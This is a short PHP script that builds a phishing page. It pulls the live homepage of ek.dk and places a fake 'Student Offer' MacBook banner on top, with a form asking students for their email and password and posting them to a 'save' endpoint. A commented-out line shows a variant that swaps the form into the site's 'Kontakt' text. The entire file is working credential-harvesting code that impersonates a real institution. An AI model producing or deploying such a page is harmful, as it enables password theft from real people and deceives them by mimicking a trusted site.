<?php

$data = file_get_contents('https://ek.dk');
$html = "
<div>
    <h1>Student Offer 1.000 MAC BOOK PRO</h1>
    <p>Only for students at EK</p>
    <form action='save' method='post'>
        <input name= 'email' type='email' placeholder='Email' />
        <input name='password' type='text' placeholder='Password' />
        <button>Get Offer</button>
    </form>
</div>";

$data = $html . $data;

//$data = str_replace('Kontakt', $html, $data);
echo $data;